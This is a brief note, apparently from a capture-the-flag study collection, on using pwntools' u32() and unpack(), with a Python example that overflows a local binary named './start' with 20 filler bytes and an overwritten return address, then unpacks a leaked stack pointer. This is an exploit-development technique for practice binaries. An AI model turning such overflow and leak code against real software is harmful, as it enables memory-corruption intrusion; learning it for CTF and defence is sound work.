---
tags:
  - python
  - binary_exploitation
---
Use `u32()` or `unpack()`
# Example
```python
from pwn import *
context.terminal = "kitty"

r = process("./start")
buf = b'A'*20
buf += p32(0x08048087)
r.send(buf)

esp = u32(r.read()[:4])
print(hex(esp))
```